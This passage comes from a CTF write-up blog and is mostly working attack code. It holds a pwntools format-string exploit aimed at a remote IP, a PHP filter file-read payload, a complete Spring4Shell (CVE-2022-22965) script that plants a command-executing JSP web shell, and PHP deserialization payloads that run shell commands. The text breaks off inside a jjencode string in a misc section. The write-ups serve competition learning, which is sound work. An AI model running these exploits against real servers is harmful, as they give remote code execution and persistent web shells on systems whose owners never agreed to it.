<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pmagic&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=remote(<span class="hljs-string">&#x27;106.14.91.65&#x27;</span>,<span class="hljs-number">10000</span>)<br><span class="hljs-comment">#p=process(&#x27;pmagic&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x400838&#x27;)</span><br>p.readuntil(<span class="hljs-string">&#x27;name.\n&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;%43$p&#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;Say&#x27;</span>,drop=<span class="hljs-number">1</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">240</span><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>fini=<span class="hljs-number">0x600a78</span><br>printf=e.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main=<span class="hljs-number">0x400797</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(fini))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(printf))<br><br>a=[<span class="hljs-number">0x97</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x40</span>]<br>i=system<br><span class="hljs-keyword">while</span> i!=<span class="hljs-number">0</span>:<br>    a.append(i&amp;<span class="hljs-number">0xff</span>)<br>    i=i&gt;&gt;<span class="hljs-number">8</span><br><br><br>b=[fini,fini+<span class="hljs-number">1</span>,fini+<span class="hljs-number">2</span>,printf,printf+<span class="hljs-number">1</span>,printf+<span class="hljs-number">2</span>,printf+<span class="hljs-number">3</span>,printf+<span class="hljs-number">4</span>,printf+<span class="hljs-number">5</span>]<br>c=&#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a)):<br>    c[a[i]]=b[i]<br><br>a.sort()<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(b)<br><span class="hljs-built_in">print</span>(c)<br>payload=<span class="hljs-string">&#x27;&#x27;</span><br>n=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">0</span>:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(a[i]-a[i-<span class="hljs-number">1</span>])+<span class="hljs-string">&#x27;c%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">28</span>+i)+<span class="hljs-string">&#x27;$hhn&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(a[i])+<span class="hljs-string">&#x27;c%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">28</span>+i)+<span class="hljs-string">&#x27;$hhn&#x27;</span><br>    n=n+<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>payload=payload.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    payload+=p64(c[i])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br><span class="hljs-built_in">print</span>(payload)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-pwn-1.jpg"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>金砖</tag>
      </tags>
  </entry>
  <entry>
    <title>2022强国杯技术技能大赛东部晋级赛wp</title>
    <url>/%E7%AB%9E%E8%B5%9B/2022%E5%BC%BA%E5%9B%BD%E6%9D%AF%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E4%B8%9C%E9%83%A8%E6%99%8B%E7%BA%A7%E8%B5%9Bwp.html</url>
    <content><![CDATA[<p>Rank：13，被打爆了</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="md5-php"><a href="#md5-php" class="headerlink" title="md5_php"></a>md5_php</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&#x27;le.php&#x27;</span>);<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快了解MD5&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;MMMMDDDD5555&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>md5弱比较，找一个加密前后都是0e开头的值</p>
<p>传入<code>?md5=0e215962017</code></p>
<p>拿到<code>le.php</code>的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;good&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;luck&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br>        <span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support flag and luck.&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>传入的值中要包含<code>good</code>，<code>luck</code>或者<code>index</code></p>
<p>用伪协议读内容，用<code>index/../flag</code>绕过判断</p>
<p>最后传入<code>?file=php://filter/convert.base64-encode/resource=index/../flag</code>拿到flag</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>通过报错页面得知是<code>spring</code></p>
<p><code>github</code>搜最新的<code>spring rce</code></p>
<p>通过<code>CVE-2022-22965</code>的<code>POC</code>getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Author: @Rezn0k</span><br><span class="hljs-comment"># Based off the work of p1n93r</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># Set to bypass errors if the target site has SSL issues</span><br>requests.packages.urllib3.disable_warnings()<br><br>post_headers = &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>&#125;<br><br>get_headers = &#123;<br>    <span class="hljs-string">&quot;prefix&quot;</span>: <span class="hljs-string">&quot;&lt;%&quot;</span>,<br>    <span class="hljs-string">&quot;suffix&quot;</span>: <span class="hljs-string">&quot;%&gt;//&quot;</span>,<br>    <span class="hljs-comment"># This may seem strange, but this seems to be needed to bypass some check that looks for &quot;Runtime&quot; in the log_pattern</span><br>    <span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-string">&quot;Runtime&quot;</span>,<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_exploit</span>(<span class="hljs-params">url, directory, filename</span>):<br>    log_pattern = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20&quot;</span> \<br>                  <span class="hljs-string">f&quot;java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter&quot;</span> \<br>                  <span class="hljs-string">f&quot;(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B&quot;</span> \<br>                  <span class="hljs-string">f&quot;%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&quot;</span><br><br>    log_file_suffix = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&quot;</span><br>    log_file_dir = <span class="hljs-string">f&quot;class.module.classLoader.resources.context.parent.pipeline.first.directory=<span class="hljs-subst">&#123;directory&#125;</span>&quot;</span><br>    log_file_prefix = <span class="hljs-string">f&quot;class.module.classLoader.resources.context.parent.pipeline.first.prefix=<span class="hljs-subst">&#123;filename&#125;</span>&quot;</span><br>    log_file_date_format = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span><br><br>    exp_data = <span class="hljs-string">&quot;&amp;&quot;</span>.join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])<br><br>    <span class="hljs-comment"># Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times</span><br>    <span class="hljs-comment"># If re-running the exploit, this will create an artifact of &#123;old_file_name&#125;_.jsp</span><br>    file_date_data = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Resetting Log Variables.&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br>    <span class="hljs-comment"># Change the tomcat log location variables</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Modifying Log Configurations&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=exp_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br>    <span class="hljs-comment"># Changes take some time to populate on tomcat</span><br>    time.sleep(<span class="hljs-number">3</span>)<br><br>    <span class="hljs-comment"># Send the packet that writes the web shell</span><br>    ret = requests.get(url, headers=get_headers, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response Code: %d&quot;</span> % ret.status_code)<br><br>    time.sleep(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># Reset the pattern to prevent future writes into the file</span><br>    pattern_data = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Resetting Log Variables.&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Spring Core RCE&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--url&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target url&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;File to write to [no extension]&#x27;</span>, required=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;shell&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--dir&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Directory to write to. Suggest using &quot;webapps/[appname]&quot; of target app&#x27;</span>,<br>                        required=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;webapps/ROOT&quot;</span>)<br><br>    file_arg = parser.parse_args().file<br>    dir_arg = parser.parse_args().<span class="hljs-built_in">dir</span><br>    url_arg = parser.parse_args().url<br><br>    filename = file_arg.replace(<span class="hljs-string">&quot;.jsp&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> url_arg <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Must pass an option for --url&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">try</span>:<br>        run_exploit(url_arg, dir_arg, filename)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Exploit completed&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Check your target for a shell&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] File: &quot;</span> + filename + <span class="hljs-string">&quot;.jsp&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> dir_arg:<br>            location = urlparse(url_arg).scheme + <span class="hljs-string">&quot;://&quot;</span> + urlparse(url_arg).netloc + <span class="hljs-string">&quot;/&quot;</span> + filename + <span class="hljs-string">&quot;.jsp&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            location = <span class="hljs-string">f&quot;Unknown. Custom directory used. (try app/<span class="hljs-subst">&#123;filename&#125;</span>.jsp?cmd=id&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Shell should be at: <span class="hljs-subst">&#123;location&#125;</span>?cmd=id&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>


<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-web2-1.png"></p>
<h2 id="PHP反序列化2"><a href="#PHP反序列化2" class="headerlink" title="PHP反序列化2"></a>PHP反序列化2</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">main</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ClassObj</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">easy</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ClassObj-&gt;<span class="hljs-title function_ invoke__">action</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">easy</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello Hacker&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;file);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;eval&#x27;</span>)!==False)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker&lt;/br&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)!==False) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker&lt;/br&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$user</span>  = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">main</span>();<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>


<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">main</span></span>&#123;<br>	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$ClassObj</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br>	&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;system(&quot;cat /fla*&quot;);&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">main</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>




<h2 id="phpti"><a href="#phpti" class="headerlink" title="phpti"></a>phpti</h2><p>字符串逃逸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;uname=<span class="hljs-variable">$uname</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&#x27;admin&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;r11.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;phpinfo()&#x27;</span>,<span class="hljs-string">&#x27;phpinfo()up&#x27;</span>,<span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]<br><span class="hljs-variable">$password</span>=<span class="hljs-number">123456</span>;<br><span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));<br><span class="hljs-variable">$test</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br></code></pre></td></tr></table></figure>

<p><code>?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;&#125;</code></p>
<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">admin</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$root</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;root;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;3123123123123\n&quot;</span>;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;root ===<span class="hljs-string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;123412341234&quot;</span>;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;aaaaaaaa&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>host:port<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>369<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary7Pufxj5tsIY9p2yA<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=n480589952d85l2vvkeb01sh9g<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">123</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;|O:5:\&quot;<span class="hljs-keyword">admin</span>\&quot;:1:&#123;s:4:\&quot;root\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA--</span></span><br></code></pre></td></tr></table></figure>


<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="不要被迷惑"><a href="#不要被迷惑" class="headerlink" title="不要被迷惑"></a>不要被迷惑</h2><p>筛选<code>http</code>协议的包，找到<code>flag.zip</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-misc1-1.png"></p>
<p>导出压缩包后爆破密码，得到<code>123321</code></p>
<p>得到一串jjencode编码字符</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">$=~[];$=&#123;<span class="hljs-attr">___</span>:++$,<span class="hljs-attr">$$$$</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">__$</span>:++$,<span class="hljs-attr">$_$_</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">_$_</span>:++$,<span class="hljs-attr">$_$$</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$$_$</span>:($[$]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">_$$</span>:++$,<span class="hljs-attr">$$$_</span>:(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$__</span>:++$,<span class="hljs-attr">$_$</span>:++$,<span class="hljs-attr">$$__</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$$_</span>:++$,<span class="hljs-attr">$$$</span>:++$,<span class="hljs-attr">$___</span>:++$,<span class="hljs-attr">$__$</span>:++$&#125;;$.$_=($.$_=$+<span class="hljs-string">&quot;&quot;</span>)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+<span class="hljs-string">&quot;&quot;</span>)[$.__$])+((!$)+<span class="hljs-string">&quot;&quot;</span>)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$.__$])+($._=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+<span class="hljs-string">&quot;\&quot;&quot;</span>+$.$$$$+(![]+<span 